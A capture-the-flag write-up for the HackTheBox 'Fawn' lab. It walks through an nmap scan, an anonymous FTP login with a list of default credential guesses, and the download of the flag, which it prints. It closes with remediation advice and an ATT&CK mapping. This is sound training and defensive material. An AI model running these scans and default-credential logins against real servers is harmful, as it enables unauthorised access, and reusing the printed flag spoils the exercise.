# Fawn — HackTheBox Starting Point

**Platform:** HackTheBox — Starting Point  
**OS:** Linux  
**Difficulty:** Very Easy  
**Date:** 23 September 2026  
**Flag:** 035db21c881520061c53e0536e44f815  

---

## Summary

Linux machine running an FTP service configured to allow
anonymous access. Connecting without credentials grants
read access to the server files, where the flag is stored
in plain sight.

**Attack chain:** nmap → FTP anonymous login (port 21)
→ list files → download flag.txt → flag

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sV --min-rate 5000 -p- 10.129.231.180
```

PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
Service Info: OS: Unix


Only one port open — port 21 FTP running vsftpd 3.0.3.  
No SSH, no HTTP, no SMB.  
The single attack surface is the FTP service.

---

## Enumeration

FTP version identified: vsftpd 3.0.3.  
First step is always to test anonymous access —
many FTP servers allow login with username "anonymous"
and an empty password by default or misconfiguration.

Common FTP login attempts:
- anonymous : (empty) → SUCCESS
- anonymous : anonymous → also works on many servers
- ftp : ftp → common alternative

Anonymous login confirmed — no credentials required.

---

## Exploitation

### Connect via FTP

```bash
ftp 10.129.231.180
```

Connected to 10.129.231.180.
220 (vsFTPd 3.0.3)
Name: anonymous
331 Please specify the password.
Password: (empty — just press Enter)
230 Login successful.
Remote system type is UNIX.
ftp>


### Enumerate files

```bash
ftp> ls
```

-rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt


### Download the flag

Important: inside the FTP prompt, the `cat` command
does not exist. Files must be downloaded with `get`
and then read locally in Kali.

```bash
ftp> get flag.txt
ftp> exit
```

```bash
cat flag.txt
```

035db21c881520061c53e0536e44f815


---

## Post-Exploitation

```bash
whoami
# no shell obtained — FTP access only

# Flag retrieved via file download:
cat flag.txt
# 035db21c881520061c53e0536e44f815
```

FTP access provides file read/download capability only.
No shell was obtained — this machine demonstrates
credential-less file exposure, not remote code execution.

---

## Findings

| # | Vulnerability | Severity | CVE/CWE | Remediation |
|---|---|---|---|---|
| 1 | FTP anonymous access enabled | High | CWE-284 | Disable anonymous FTP login in vsftpd.conf — set anonymous_enable=NO |
| 2 | Sensitive file (flag.txt) accessible without auth | Critical | CWE-732 | Restrict file permissions and disable anonymous access |
| 3 | FTP transmits data in cleartext | Medium | CWE-319 | Replace FTP with SFTP (SSH File Transfer Protocol) — encrypted |
| 4 | vsftpd exposed on public interface | Medium | CWE-284 | Restrict FTP access by IP or use firewall rules to limit exposure |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning | T1595.001 |
| Initial Access | Valid Accounts: Default Accounts | T1078.001 |
| Discovery | File and Directory Discovery | T1083 |
| Collection | Data from Local System | T1005 |

